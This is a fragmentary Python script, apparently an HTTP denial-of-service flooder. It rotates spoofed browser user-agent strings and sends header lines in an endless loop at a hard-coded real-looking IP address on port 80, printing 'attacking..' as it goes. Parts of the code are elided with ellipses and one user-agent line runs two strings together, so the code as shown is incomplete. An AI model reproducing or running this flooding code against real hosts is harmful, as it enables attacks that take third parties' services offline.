...
headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
...
def a(ip,k):
    ...
    try:
        ...
        s.sendto("User-Agent: {}\r\n".format(useragent).encode("utf-8"),(ip,k))
        s.sendto("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"),(ip,k))
        print(useragent+"attacking..")
    except socket.error:
        print(' CHECK THE HOST!!!!')
while True:
    a( b"183.60.47.219", 80)